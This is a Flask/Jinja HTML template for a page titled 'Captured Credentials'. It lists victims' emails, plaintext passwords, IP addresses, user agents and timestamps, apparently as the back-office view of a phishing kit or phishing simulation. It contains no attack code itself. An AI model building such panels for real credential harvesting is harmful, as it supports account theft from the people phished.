<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">>
  <title>Captured Credentials</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f4f4f4;
      padding: 2em;
    }
    table {
      width: 100%;
      border-collapse: collapse;
      background: white;
    }
    th, td {
      padding: 0.7em;
      border: 1px solid #ccc;
    }
    th {
      background-color: #007bff;
      color: white;
    }
    tr:nth-child(even) {
      background-color: #f8f8f8;
    }
    .logout {
      margin-top: 1em;
    }
  </style>
</head>
<body>
  <h2>Captured Credentials</h2>
  <table>
    <tr>
      <th>ID</th>
      <th>Email</th>
      <th>Password</th>
      <th>IP</th>
      <th>User-Agent</th>
      <th>Timestamp</th>
      <th>Status</th>
    </tr>
    {% for row in credentials %}
    <tr>
      <td>{{ row[0] }}</td>
      <td>{{ row[1] }}</td>
      <td>{{ row[2] }}</td>
      <td>{{ row[3] }}</td>
      <td>{{ row[4] }}</td>
      <td>{{ row[5] }}</td>
      <td>{{ row[6] }}</td>
    </tr>
    {% endfor %}
  </table>

  <div class="logout">
    <a href="{{ url_for('routes.logout') }}">Logout</a>
  </div>
</body>
</html>
